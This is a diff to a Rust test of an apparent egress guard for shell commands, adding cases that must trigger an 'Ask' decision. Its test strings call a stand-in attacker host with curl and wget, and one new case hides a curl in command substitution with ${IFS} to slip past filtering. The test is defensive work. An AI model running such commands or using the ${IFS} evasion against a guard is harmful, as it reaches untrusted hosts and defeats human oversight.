@@ -163,6 +163,8 @@ fn test_egress_other_host_asks() {
         "curl https://evil.test/x",
         "curl https://api.github.com/x; curl https://evil.test/y",
         "curl https://api.github.com/x; wget https://evil.test/y",
+        "A=$(curl${IFS}https://evil.test/x); curl https://api.github.com/x",
+        "curl -L https://api.github.com/x",
     ] {
         assert!(
             matches!(g.decide(&bash_req(command)).outcome(), Outcome::Ask),
